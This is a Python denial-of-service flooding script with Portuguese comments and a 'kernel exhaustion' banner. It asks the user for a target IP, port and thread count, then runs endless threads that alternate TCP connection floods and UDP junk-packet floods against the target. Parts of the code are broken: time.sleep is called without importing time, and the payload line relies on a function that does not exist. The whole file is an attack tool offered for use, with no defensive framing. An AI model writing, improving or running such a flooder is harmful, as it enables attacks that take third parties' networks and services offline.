import socket
import threading
import random
import os
from colorama import Fore, init

init(autoreset=True)

def show_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
{Fore.GREEN}    ██████╗ ███████╗██████╗ ███████╗███████╗ ██████╗
{Fore.GREEN}    ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔════╝██╔════╝
{Fore.WHITE}    ██║  ██║█████╗  ██║  ██║███████╗█████╗  ██║     
{Fore.WHITE}    ██║  ██║██╔══╝  ██║  ██║╚════██║██╔══╝  ██║     
{Fore.GREEN}    ██████╔╝███████╗██████╔╝███████║███████╗╚██████╗
{Fore.GREEN}    ╚═════╝ ╚══════╝╚═════╝ ╚══════╝╚══════╝ ╚═════╝
{Fore.YELLOW}             [ EXCLUSIVE KERNEL EXHAUSTION TOOL ]
    """)

# --- CONFIGURAÇÕES AGRESSIVAS ---
target_ip = ""
target_port = 80
bytes_payload = random._urllib_detect_encoding(random.getrandbits(2048)) if hasattr(random, '_urllib_detect_encoding') else b"X" * 2048

def attack_kernel():
    """ Foca em saturar a CPU via UDP e Conexões Pendentes """
    while True:
        try:
            # Alterna entre TCP SYN e UDP Flood
            choice = random.randint(1, 2)
            
            if choice == 1:
                # TCP SYN Flood (Esgota a Tabela de Estados)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.001)
                s.connect((target_ip, target_port))
            else:
                # UDP Flood (Força o processador a calcular rotas de pacotes lixo)
                u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                u.sendto(bytes_payload, (target_ip, target_port))
        except:
            pass

if __name__ == "__main__":
    show_banner()
    target_ip = input(f"{Fore.CYAN}[?] IP do Alvo: ")
    target_port = int(input(f"{Fore.CYAN}[?] Porta do Alvo: "))
    threads = int(input(f"{Fore.CYAN}[?] Quantidade de Threads (Agressivo: 800+): "))

    print(f"\n{Fore.RED}[!] INICIANDO KERNEL-KILLER... O ROTEADOR PODE TRAVAR EM BREVE.")
    
    for i in range(threads):
        threading.Thread(target=attack_kernel, daemon=True).start()

    while True:
        try:
            time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Ataque interrompido.")
            break